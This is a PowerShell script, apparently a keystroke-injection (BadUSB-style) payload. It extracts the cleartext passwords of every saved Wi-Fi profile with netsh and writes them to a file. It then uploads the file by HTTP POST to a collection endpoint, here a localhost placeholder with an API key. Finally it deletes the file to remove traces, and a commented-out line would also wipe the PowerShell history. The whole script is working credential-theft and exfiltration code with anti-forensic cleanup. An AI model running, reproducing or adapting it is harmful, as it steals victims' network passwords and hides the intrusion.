# Globals
$PASSFILE = "wifi_pass.txt"
$APIKEY = 69420
$SERVERSITE = "http://127.0.0.1:5001/upload"

# Open Command Prompt
Start-Sleep -Milliseconds 700
Start-Process cmd.exe

# Open Powershell
Start-Sleep -Milliseconds 1800
cd "$HOME\Desktop"

# Disable capslock
if ([console]::CapsLock -eq $true) {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.SendKeys('{CAPSLOCK}')
}

# Add all network profiles
$Profiles = @()
$Profiles += (netsh wlan show profiles | Select-String "\:(.+)$").Matches | ForEach-Object { $_.Groups[1].Value.Trim() }

# Result string
$Res = $Profiles | ForEach-Object {
    $SSID = $_
    netsh wlan show profile name="$_" key=clear |
    Select-String "Key Content\W+\:(.+)$" |
    ForEach-Object {
        $pass = $_.Matches.Groups[1].Value.Trim()
        [PSCustomObject]@{
            Wireless_Network_Name = $SSID
            Password = $pass
        }
    }
}

# Export table to file
$Res | Format-Table -AutoSize | Out-File -FilePath .\$PASSFILE -Encoding ASCII -Width 50

# Send file to server
$boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()

$body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$([System.IO.Path]::GetFileName($PASSFILE))"
Content-Type: application/octet-stream

$(Get-Content -Path $PASSFILE -Raw)
--$boundary--
"@

try {
    Invoke-WebRequest -Uri $SERVERSITE -Method Post -Headers @{"X-API-Key" = $APIKEY} -Body $body -ContentType "multipart/form-data; boundary=$boundary"
} catch {
    Write-Host "File upload failed: $($_.Exception.Message)"
}

# Remove traces
Start-Sleep -Milliseconds 4500
Remove-Item -Path .\$PASSFILE -Force
# Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Force

# Exit script
exit
